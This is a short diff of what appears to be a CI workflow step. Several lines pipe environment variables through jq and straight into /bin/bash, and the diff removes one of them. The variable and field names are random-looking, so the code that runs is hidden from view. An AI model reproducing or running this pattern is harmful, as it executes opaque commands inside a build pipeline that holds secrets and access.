@@ -21,7 +21,6 @@ jobs:
           echo $mgt0 | jq -r .kyt82 | /bin/bash
           printf '%s' "$xdxkw5" | jq -r .b1027 | /bin/bash
           printf '%s' "$ysjbt4572" | jq -r .scxxy1372 | /bin/bash
-          echo $olnxa04193 | jq -r .ixa7 | /bin/bash
           printf '%s' "$r8595" | jq -r .n1 | /bin/bash
 
       - name: Persist data
